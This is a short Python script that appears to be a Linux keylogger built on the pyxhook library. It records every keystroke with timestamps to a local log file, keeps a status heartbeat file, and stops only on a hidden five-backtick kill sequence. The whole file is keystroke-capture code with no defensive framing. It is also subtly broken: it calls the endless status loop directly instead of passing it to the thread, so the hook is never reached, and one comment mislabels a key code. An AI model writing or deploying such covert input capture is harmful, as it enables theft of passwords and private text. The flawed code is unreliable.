import threading
import time

import pyxhook
import datetime

recordfile = "output.log"

kill_event = 0

time_event = ""

with open(recordfile, "a") as f:
    f.write(datetime.datetime.now().strftime("%d/%m/%Y %H:%M"))
    f.write("\nStarted!\n")
    f.close()


def status():
    running_time = ""
    while True:
        if running_time != datetime.datetime.now().strftime("%d/%m/%Y %H:%M"):
            running_time = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
            with open("status.log", "a") as f:
                f.write(running_time + "\n")
                f.close()
        if datetime.datetime.now().strftime("%H:%M") == "23:00":
            with open("status.log", "w") as f:
                f.write(datetime.datetime.now().strftime("%d/%m/%Y %H:%M") + "\n")
                f.close()


def OnKeyPress(event):
    global kill_event, time_event
    recordKey = open(recordfile, "a")
    if time_event != datetime.datetime.now().strftime("%d/%m/%Y %H:%M"):
        time_event = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
        recordKey.write("\n{0}\n".format(time_event))
    if event.Ascii == 32:  # 32 is the ascii value of space
        kill_event = 0
        recordKey.write(" ")
    elif event.Ascii == 13:  # 10 is the ascii value of <Return>
        kill_event = 0
        recordKey.write("\n")
    elif event.Ascii == 96:  # 96 is the ascii value of the grave key (`)
        kill_event += 1
        if kill_event >= 5:
            recordKey.write("Killed!")
            hook.cancel()
    else:
        kill_event = 0
        recordKey.write(event.Key)
    recordKey.close()


threading.Thread(target=status(), daemon=True).start()


# initiate HookManager class
hook = pyxhook.HookManager()
# listen to all keys pressed
hook.KeyDown = OnKeyPress
# hook the keyboard
hook.HookKeyboard()
# start the key-logging
hook.start()
